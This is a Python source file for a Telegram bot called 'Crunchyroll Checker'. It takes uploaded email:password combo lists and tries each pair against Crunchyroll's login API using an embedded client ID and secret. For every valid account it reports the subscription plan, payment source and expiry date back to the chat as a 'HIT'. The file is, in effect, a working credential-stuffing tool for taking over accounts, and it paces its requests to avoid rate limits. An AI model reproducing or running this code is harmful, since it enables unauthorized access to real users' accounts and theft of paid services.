import os
import asyncio
import requests
import time
from uuid import uuid1
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Colors for console
G = '\033[2;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m'

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

# ====================== YOUR CHECKER FUNCTION ======================
def login(email: str, pasw: str):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }

    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",
                            data=data, headers=headers, timeout=15)
        res.raise_for_status()
        text = res.text

        if "access_token" not in text:
            return f"{R}[BAD] {email}:{pasw}"

        token = text.split('access_token":"')[1].split('"')[0]

        headers_get = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "Ktor client",
            "Host": "beta-api.crunchyroll.com",
            "Connection": "Keep-Alive"
        }

        res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
                               headers=headers_get, timeout=10)

        if "external_id" not in res_get.text:
            return f"{R}[BAD] {email}:{pasw}"

        external_id = res_get.text.split('external_id":"')[1].split('"')[0]

        res_info = requests.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
            headers=headers_get, timeout=10
        )

        text_info = res_info.text.lower()
        if any(x in text_info for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
            try:
                typ = res_info.text.split('"type":"')[1].split('"')[0]
                free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]
                payment = res_info.text.split('"source":"')[1].split('"')[0]
                expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]

                msg = f"""
🔥 **HIT** 🔥
**Email:** `{email}`
**Pass:** `{pasw}`
**Plan:** {typ}
**Free Trial:** {free_t}
**Payment:** {payment}
**Expiry:** {expiry}
"""
                return msg
            except:
                return f"{G}[HIT] {email}:{pasw}"
        else:
            return f"{O}[CUSTOM] {email}:{pasw}"

    except Exception as e:
        if "406 Not Acceptable" in str(e):
            return "Rate limited — waiting..."
        return f"{R}[BAD] {email}:{pasw}"

# ====================== BOT HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Crunchyroll Checker Bot**\n\n"
        "Send me a `.txt` combo file (email:password)\n"
        "I will check it and send results live."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = await update.message.reply_text("📥 Downloading file...")

    file = await update.message.document.get_file()
    combo_path = "combo.txt"
    await file.download_to_drive(combo_path)

    await message.edit_text("🔍 Checking accounts... (this can take a while)")

    with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]

    hits = 0
    customs = 0
    bads = 0

    for i, line in enumerate(lines, 1):
        try:
            email, pasw = line.split(":", 1)
            result = login(email.strip(), pasw.strip())

            if "HIT" in result:
                hits += 1
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=result,
                    parse_mode=ParseMode.MARKDOWN
                )
            elif "CUSTOM" in result:
                customs += 1
            else:
                bads += 1

            # Progress update every 10 checks
            if i % 10 == 0 or i == len(lines):
                await message.edit_text(
                    f"📊 Progress: {i}/{len(lines)}\n"
                    f"✅ Hits: {hits} | 🟡 Customs: {customs} | ❌ Bads: {bads}"
                )

            time.sleep(1.2)  # avoid rate limit

        except:
            continue

    # Final summary
    summary = f"""
✅ **Check Finished!**

**Total lines:** {len(lines)}
**Hits:** {hits}
**Customs:** {customs}
**Bads:** {bads}
"""
    await message.edit_text(summary)

    # Cleanup
    if os.path.exists(combo_path):
        os.remove(combo_path)

# ====================== MAIN (RAILWAY-FRIENDLY) ======================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🤖 Crunchyroll Bot is now running on Railway...")
    app.run_polling()   # ← This is the important change (sync method)

if __name__ == "__main__":
    main()
